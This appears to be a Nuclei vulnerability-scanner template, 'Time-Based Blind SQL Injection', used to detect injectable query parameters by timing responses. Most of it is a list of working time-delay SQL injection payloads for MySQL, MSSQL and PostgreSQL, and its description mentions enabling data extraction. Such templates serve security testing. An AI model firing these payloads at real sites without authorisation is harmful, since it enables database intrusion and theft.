flow: http(1) && http(2)
http:
- matchers:
  - dsl:
    - duration<=7
    internal: true
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}'
- fuzzing:
  - fuzz:
    - '{{injection}}'
    mode: single
    part: query
    type: replace
  matchers:
  - dsl:
    - duration>=7 && duration <=16
    type: dsl
  payloads:
    injection:
    - (SELECT(0)FROM(SELECT(SLEEP(7)))a)
    - '''XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR''Z'
    - ''' AND (SELECT 4800 FROM (SELECT(SLEEP(7)))HoBG)--'
    - if(now()=sysdate(),SLEEP(7),0)
    - '''XOR(if(now()=sysdate(),SLEEP(7),0))XOR''Z'
    - '''XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(7) ELSE 0 END)XOR''Z'
    - sleep(7)#
    - 1 or sleep(7)#
    - '" or sleep(7)#'
    - ''' or sleep(7)#'
    - '" or sleep(7)="'
    - ''' or sleep(7)='''
    - 1) or sleep(7)#
    - '") or sleep(7)="'
    - ''') or sleep(7)='''
    - 1)) or sleep(7)#
    - '")) or sleep(7)="'
    - ''')) or sleep(7)='''
    - AND (SELECT * FROM (SELECT(SLEEP(7)))bAKL) AND 'vRxe'='vRxe
    - AND (SELECT * FROM (SELECT(SLEEP(7)))YjoC) AND '%'='
    - AND (SELECT * FROM (SELECT(SLEEP(7)))nQIP)
    - AND (SELECT * FROM (SELECT(SLEEP(7)))nQIP)--
    - AND (SELECT * FROM (SELECT(SLEEP(7)))nQIP)#
    - SLEEP(7)#
    - SLEEP(7)--
    - SLEEP(7)="
    - SLEEP(7)='
    - or SLEEP(7)
    - or SLEEP(7)#
    - or SLEEP(7)--
    - or SLEEP(7)="
    - or SLEEP(7)='
    - AnD SLEEP(7)
    - AnD SLEEP(7)--
    - AnD SLEEP(7)#
    - '&&SLEEP(7)'
    - '&&SLEEP(7)--'
    - '&&SLEEP(7)#'
    - ''' AnD SLEEP(7) ANd ''1'
    - '''&&SLEEP(7)&&''1'
    - ORDER BY SLEEP(7)
    - ORDER BY SLEEP(7)--
    - ORDER BY SLEEP(7)#
    - (SELECT * FROM (SELECT(SLEEP(7)))ecMj)
    - (SELECT * FROM (SELECT(SLEEP(7)))ecMj)#
    - (SELECT * FROM (SELECT(SLEEP(7)))ecMj)--
    - + SLEEP(7) + '
    - SLEEP(7)/*' or SLEEP(7) or '" or SLEEP(7) or "*/
    - ;waitfor delay '0:0:7'--
    - );waitfor delay '0:0:7'--
    - ''';waitfor delay ''0:0:7''--'
    - '";waitfor delay ''0:0:7''--'
    - ''');waitfor delay ''0:0:7''--'
    - '");waitfor delay ''0:0:7''--'
    - ));waitfor delay '0:0:7'--
    - '''));waitfor delay ''0:0:7''--'
    - '"));waitfor delay ''0:0:7''--'
    - waitfor delay '00:00:07'
    - waitfor delay '00:00:07'--
    - waitfor delay '00:00:07'#
    - pg_sleep(7)--
    - 1 or pg_sleep(7)--
    - '" or pg_sleep(7)--'
    - ''' or pg_sleep(7)--'
    - 1) or pg_sleep(7)--
    - '") or pg_sleep(7)--'
    - ''') or pg_sleep(7)--'
    - 1)) or pg_sleep(7)--
    - '")) or pg_sleep(7)--'
    - ''')) or pg_sleep(7)--'
    - pg_SLEEP(7)
    - pg_SLEEP(7)--
    - pg_SLEEP(7)#
    - or pg_SLEEP(7)
    - or pg_SLEEP(7)--
    - or pg_SLEEP(7)#
  raw:
  - '@timeout: 20s

    GET / HTTP/1.1

    Host: {{Hostname}}

    '
  stop-at-first-match: true
id: time-based-sqli
info:
  author: 0xKayala,Jaenact
  description: 'Sends time-delay SQL payloads and measures response latency to confirm
    blind injection in various database engines, enabling data extraction without
    direct error messages.

    '
  name: Time-Based Blind SQL Injection
  severity: critical
  tags: time-based-sqli,sqli,dast,blind,vuln
